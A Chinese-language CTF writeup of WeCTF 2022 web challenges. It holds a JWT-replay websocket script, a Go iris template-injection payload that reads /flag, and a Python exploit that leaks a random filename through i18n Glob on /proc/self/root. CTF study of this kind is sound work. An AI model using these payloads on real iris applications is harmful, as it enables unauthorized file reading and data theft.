---
title: WeCTF 2022 writeup
date: 2022-10-25 22:28:00
updated: 2022-10-27 13:36:00
tags: [ctf, security]
description: 只有Web的CTF比赛，复盘看看题目
---

## DinoRun

Welcome to WECTF! Play this tiny multiplayer game and get the easy flag.

> Source Code: [dino-run/](https://github.com/wectf/2022/tree/master/dino-run)
> Local Address (WS): [http://localhost:1001](http://localhost:1001/)
> Local Address (Frontend): [http://localhost:1012](http://localhost:1012/)
> Solved Count: 159
> Points: 10

签到题，走到右下角就有Flag。

![image-20221025110642545](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20221025110642545.png)

## DinoRun (Extra Hard)

Isn't the Dino Run too easy? Try out this more difficult one.

> Source Code: [dino-run/](https://github.com/wectf/2022/tree/master/dino-run)
> Local Address (WS): [http://localhost:1004](http://localhost:1004/)
> Local Address (Frontend): [http://localhost:1013](http://localhost:1013/)
> Solved Count: 9
> Points: 585
> Attack Type: JWT Token Reuse

题目增加了对恐龙移动范围的限制，当从出发点`(0,0)`移动距离超过`1/2`地图大小时，每一次移动恐龙就有`0.99`的概率死亡。

```js
// determine whether is dino dead
const isDead = (pos) => {
    let {x, y} = pos;
    const distance = Math.sqrt(Math.pow(boardSize - x, 2) + Math.pow(boardSize - y, 2));
    const travelPercentage = 1 - distance / boardMinWalkDistance;
    if (Math.random() < travelPercentage) return true;
    if (travelPercentage > 0.5) { // just to make rest of the trip extra hard
        if (Math.random() < 0.99) {
            return true;
        }
    }
    return false;
}
```

而且JWT的使用并不存在问题，而移动的方向和目前所在的问题通过JWT进行存储，这样的话我们并不能篡改服务端在我们做出行动后返回的JWT,因此不可能直接让恐龙到达终点`(32,32)`，但是因为恐龙是有`0.99`的概率死亡，因此在移动到`(16,17)`可以尝试不停的发送一个JWT,直至服务端没有判断到这`0.99`的概率，返回一个存储了位置为`(17,17)`的JWT,然后再一直发这个JWT,来让恐龙最终到达右下角。

> https://blog.hamayanhamayan.com/entry/2022/06/13/193106

参考文章中的脚本可以复现题目。

```python
import asyncio
import websockets
import json

ix = 0
iy = 0
start_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJwb3NpdGlvbiI6eyJ4IjowLCJ5IjowfSwiZGVhZCI6ZmFsc2UsImtleSI6Im8veGtOd04yRWF4ZzFHVTBteWlLWDZZWFJISitET0JPRjVrUW1BdlE0Tzg9IiwibmFtZSI6InNkZnNkZnNhZGYiLCJpYXQiOjE2NjY3NTc1OTV9.kfT0DOkikYTkTKVN_q4Ny7NwEsyYkivVSTOxDWoskEcWslvhqweSX9qlIZqJTZgtR7YUHv9fEX5x9z5ekHdvyr81EAuWG6lvxX5FC9ngxVb6vKQ-T4tGetE5MTQYqA8bs39rGN4suVXH5ZMHSrpTaNgr99bnDjkytJNFT-XgE3kYKEmJRQ0KcNk703GGNx0qhqRmwPXjtD1nhJ7F8S6W6frCh7_V-JGedbv9ieDsdUR-NmOdRg2kevWRNwzrAMj0NkZubdd92nFsWj-N3N8L0yiKG41WG2gDLPIuRCpIZTPDCCt7G5u7En6i2zzMOvfUSjJRHvZ8JPQIWhe6TP3LAA"

async def solve():
    uri = "ws://127.0.0.1:1004"
    async with websockets.connect(uri) as websocket:
        token = start_token
        i = ix + iy
        failed = 0

        while i < 31 * 2:
            com = "right" if i % 2 == 0 else "down"
            data = {"command": com, "token": token}
            await websocket.send(json.dumps(data))
            for _ in range(10):
                resp = json.loads(await websocket.recv())
                print(resp)
                if resp['command'] != "state":
                    break
            if resp['dead']:
                failed += 1
                # print(f"NG!{failed}", end="")
                # sys.stdout.flush()
            else:
                token = resp['token']

                i += 1
                x = i // 2 + i % 2
                y = i // 2
                failed = 0

                print(f"\nOK! You can move! x:{x} y:{y} token:{token}")
            await asyncio.sleep(0.1)

asyncio.get_event_loop().run_until_complete(solve())
```

## Grafana

It looks safe, does it? After all it has a fancy UI so it must be safe.

> Source Code: [grafana/](https://github.com/wectf/2022/tree/master/grafana)
> Local Address: [http://localhost:1002](http://localhost:1002/)
> Solved Count: 100
> Points: 16
> Attack Type: Directory Traversal

在CTF比赛中出现过很多次了，Grafana的目录穿越漏洞导致任意文件读取。

![image-20221026135004326](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20221026135004326.png)

顺便推荐一下`Yakit`，真的好用

## Google Wayback

A copycat site of Google in 2001.

Hint: Do you know Google used to have XSS?

An admin bot is going to visit the link you provided and your task is to leak the cookie of admin. You can simulate this locally but first navigate to the site, execute JavaScript: `document.cookie = "flag: we{test}"` and finally visit the link that points to your payload.

> Source Code: [google/](https://github.com/wectf/2022/tree/master/google)
> Local Address: [http://localhost:1003](http://localhost:1003/)
> Solved Count: 25
> Points: 338
> Attack Type: CSRF, XSS

这题很烦的是有谷歌验证码，所以我如果在本地打就需要Chrome -> Clash -> Yakit/Burpsuite，但是实际上我给Yakit配置了下游代理后还是不太行，唔之后在服务器上起一下环境做吧，先看其他题目好了。

## Request Bin

Request bin has been one of the most helpful tool for Shou during his software (CRUD) engineering career! So, he decided to create yet another one by himself.

Flag is located at /flag

> Source Code: [request-bin/](https://github.com/wectf/2022/tree/master/request-bin)
> Local Address: [http://localhost:1005](http://localhost:1005/)
> Solved Count: 21
> Points: 1610
> Attack Type: Template Injection

一道Golang的模板注入题目，采用的框架是`iris`，用户可以对日志的格式参数进行控制，而参数又会被当成模板渲染，所以这里存在模板注入的漏洞。

类似的Golang框架SSTI从注入点来挖掘漏洞如何利用可以看这篇文章`https://www.onsecurity.io/blog/go-ssti-method-research/`，里面提到了`Echo`框架的SSTI点如何去利用，其中通过`File`方法实现了任意文件读取，那么这里我们需要看看`iris`的`accesslog`库的模板注入如何利用。

在[AccessLog的结构体](https://github.com/kataras/iris/blob/master/middleware/accesslog/log.go#L15-L56)中我们发现

```golang
type Log struct {
	// The AccessLog instance this Log was created of.
	Logger *AccessLog `json:"-" yaml:"-" toml:"-"`

	// The time the log is created.
	Now time.Time `json:"-" yaml:"-" toml:"-"`
	// TimeFormat selected to print the Time as string,
	// useful on Template Formatter.
	TimeFormat string `json:"-" yaml:"-" toml:"-"`
	// Timestamp the Now's unix timestamp (milliseconds).
	Timestamp int64 `json:"timestamp" csv:"timestamp"`

	// Request-Response latency.
	Latency time.Duration `json:"latency" csv:"latency"`
	// The response status code.
	Code int `json:"code" csv:"code"`
	// Init request's Method and Path.
	Method string `json:"method" csv:"method"`
	Path   string `json:"path" csv:"path"`
	// The Remote Address.
	IP string `json:"ip,omitempty" csv:"ip,omitempty"`
	// Sorted URL Query arguments.
	Query []memstore.StringEntry `json:"query,omitempty" csv:"query,omitempty"`
	// Dynamic path parameters.
	PathParams memstore.Store `json:"params,omitempty" csv:"params,omitempty"`
	// Fields any data information useful to represent this Log.
	Fields memstore.Store `json:"fields,omitempty" csv:"fields,omitempty"`
	// The Request and Response raw bodies.
	// If they are escaped (e.g. JSON),
	// A third-party software can read it through:
	// data, _ := strconv.Unquote(log.Request)
	// err := json.Unmarshal([]byte(data), &customStruct)
	Request  string `json:"request,omitempty" csv:"request,omitempty"`
	Response string `json:"response,omitempty" csv:"response,omitempty"`
	//  The actual number of bytes received and sent on the network (headers + body or body only).
	BytesReceived int `json:"bytes_received,omitempty" csv:"bytes_received,omitempty"`
	BytesSent     int `json:"bytes_sent,omitempty" csv:"bytes_sent,omitempty"`

	// A copy of the Request's Context when Async is true (safe to use concurrently),
	// otherwise it's the current Context (not safe for concurrent access).
	Ctx *context.Context `json:"-" yaml:"-" toml:"-"`
}
```

这里我们可以去调用的有`Ctx`，这是一个`context`对象。

再跟进到[context的源代码](https://github.com/kataras/iris/blob/master/middleware/accesslog/log.go#L15-L56)，发现实现了ServeFile方法，而可以对文件内容进行读取。

```golang
// ServeFile replies to the request with the contents of the named
// file or directory.
//
// If the provided file or directory name is a relative path, it is
// interpreted relative to the current directory and may ascend to
// parent directories. If the provided name is constructed from user
// input, it should be sanitized before calling `ServeFile`.
//
// Use it when you want to serve assets like css and javascript files.
// If client should confirm and save the file use the `SendFile` instead.
// Note that compression can be registered
// through `ctx.CompressWriter(true)` or `app.Use(iris.Compression)`.
func (ctx *Context) ServeFile(filename string) error {
	return ctx.ServeFileWithRate(filename, 0, 0)
}

// ServeFileWithRate same as `ServeFile` but it can throttle the speed of reading
// and though writing the file to the client.
func (ctx *Context) ServeFileWithRate(filename string, limit float64, burst int) error {
	f, err := os.Open(filename)
	if err != nil {
		ctx.StatusCode(http.StatusNotFound)
		return err
	}
	defer f.Close()

	st, err := f.Stat()
	if err != nil {
		code := http.StatusInternalServerError
		if os.IsNotExist(err) {
			code = http.StatusNotFound
		}

		if os.IsPermission(err) {
			code = http.StatusForbidden
		}

		ctx.StatusCode(code)
		return err
	}

	if st.IsDir() {
		return ctx.ServeFile(path.Join(filename, "index.html"))
	}

	ctx.ServeContentWithRate(f, st.Name(), st.ModTime(), limit, burst)
	return nil
}
```

因此有Payload:`{{ .Ctx.ServeFile "/flag" }}`

## Request Bin (Extra Hard)

I suppose you have already managed to steal Shou's flag. Shou is also aware of this so he hided the flag better. What's more can you accomplish with Shou's buggy app?

> Source Code: [request-bin/](https://github.com/wectf/2022/tree/master/request-bin)
> Local Address: [http://localhost:1006](http://localhost:1006/)
> Solved Count: 4
> Points: 2526
> Attack Type: Template Injection

变难的地方就是Flag的文件名改成了随机的，因此这里需要通过想办法来读取这个随机生成的文件名。

搜到了[ark师傅的exp](https://gist.github.com/arkark/51e6dee1c548616ed35ac64fbe006fc1)，思路是通过context调用 i18n 中的 glob 构造Payload。因为i18n这个函数中return了Glob函数，而Glob可以通过通配符`?`来进行正则匹配，从而把文件名爆出来。

```python
import httpx
import urllib

BASE_URL = "http://localhost:1006"
# BASE_URL = "http://nlmlbpltcorlkzamsnmhbiynwigiqcmi.g2.ctf.so"


def is_ok(filename: str) -> bool:
    # E.g. filename == "e9ae21d2-226a-45e7-a039-5???????????-????????-????-????-????-????????????"
    # `?` is used as an arbitrary character in Glob.

    payload = ""
    # https://github.com/kataras/iris/blob/v12.2.0-beta3/context/application.go#L16
    payload += '{{ $app := .Ctx.Application }}'
    # https://github.com/kataras/iris/blob/v12.2.0-beta3/i18n/i18n.go#L131
    # This function uses Glob. You can judge the prefix of the file name using Glob and `/proc/self/root`.
    payload += '{{ $app.I18n.Load "/proc/self/root/{{FILENAME}}" }}'.replace('{{FILENAME}}', filename)

    url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)

    res = httpx.get(
        url,
        follow_redirects=True,
    )
    # https://github.com/kataras/iris/blob/v12.2.0-beta3/i18n/loader.go#L97
    # If the prefix hits, Iris loads the file as a yaml file and fail it. Then, Iris prints a error message.
    return "line 1: cannot unmarshal" in res.text


N = 64
hyphen_positions = [8, 4, 4, 4, 12, 8, 4, 4, 4, 12]
for i in range(1, len(hyphen_positions)):
    hyphen_positions[i] += hyphen_positions[i-1]
assert hyphen_positions[-1] == N

xs = [None] * N

CHARS = "0123456789abcdef"  # characters of uuid
for i in range(N):
    ys = []
    k = 0
    cur = None
    for j in range(N):
        if j == hyphen_positions[k]:
            ys.append("-")
            k += 1
        if j == i:
            cur = len(ys)
        if j < i:
            ys.append(xs[j])
        else:
            ys.append("?")

    hit_c = None
    for c in CHARS:
        ys[cur] = c
        filename = "".join(ys)

        if is_ok(filename):
            hit_c = c
            break

    assert hit_c != None
    xs[i] = hit_c
    print(filename)


filename = ""
k = 0
for j in range(N):
    if j == hyphen_positions[k]:
        filename += "-"
        k += 1
    filename += xs[j]
filename = "".join(ys)
print(filename)  # Get the file name of `/$(uuidgen)-$(uuidgen)`


# https://github.com/kataras/iris/blob/v12.2.0-beta3/context/context.go#L5128
payload = '{{ .Ctx.ServeFile "/{{FILENAME}}" }}'.replace('{{FILENAME}}', filename)

url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)
res = httpx.get(
    url,
    follow_redirects=True,
)
print(res.text)  # Get a flag!
```

![image-20221026162452607](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20221026162452607.png)

那么在学习完大佬的Exp后我又很奇怪为什么这里要通过`/proc/self/root`找到flag文件所在的位置呢，直接`/`不行么？（下文中`xxxx-xxx-xx`代表根据uuid生成的Flag文件名）

先说结论，直接用`/`确实不行，在经过一番测试之后发现`/proc/self/root`是指向`/`的软链接，而这里我们通过`/proc/self/root`/可以正常回显，在Glob匹配正确时返回

```
yaml: unmarshal errors:
  line 1: cannot unmarshal !!str `we{3d85...` into map[string]interface {}
```

而在Glob匹配错误时返回`catalog: empty languages`

但是如果这里用`/`或者`/root/../`去尝试匹配的话，会发现无论如何都是`catalog: empty languages`。

所以我们先通过打断点，把通过`proc/self/root`和`/`去匹配两种方法进行比较，在打了两个小时断点后发现如果传入`/proc/self/root/xxxx-xxx-xx--xx`这样格式的filename

![image-20221027132150315](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20221027132150315.png)

因为`i18n`的`Loader`函数本身是用于加载语言文件的，这里会将带有`-`的文件名按`-`分别解析，而他这个库本身应该是设定了对于名称带`-`的语言文件，按照`-`解析出每个部分字符串后，每个部分字符串的长度不会超过4个字符，所以这里如果是直接`/xxxxxx-xxxx-xx`的文件名字，第一部分是8个字符，因此最终也会像`Glob`匹配不到语言文件一样，同样的返回`catalog: empty languages`。

而如果传入`/proc/self/root/xxxxxx-x-x-x-x-`呢？解析器会解析成四个部分，分别为`proc`，`self`，`root`，`xxxxx-xxxx-xxx`，并且倒序去解析（想理解的话需要自己打断点尝试一下并且审计一下iris的i18n库的源代码，是比较复杂的），那么同样的解析`xxxxx-xxxx-xxx`也会抛出`error`而这里写了`err!=nil`就`continue`的操作，因此解析器会继续去尝试用`root`作为目录解析，然后呢这里`root`是不会报错的，因此导致了上面的问题。

![image-20221027132742107](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20221027132742107.png)

那么`/root/../`为什么也不行呢，这里有兴趣的读者可以尝试一下，我觉得问题应该是大同小异的，所以就不去尝试了。
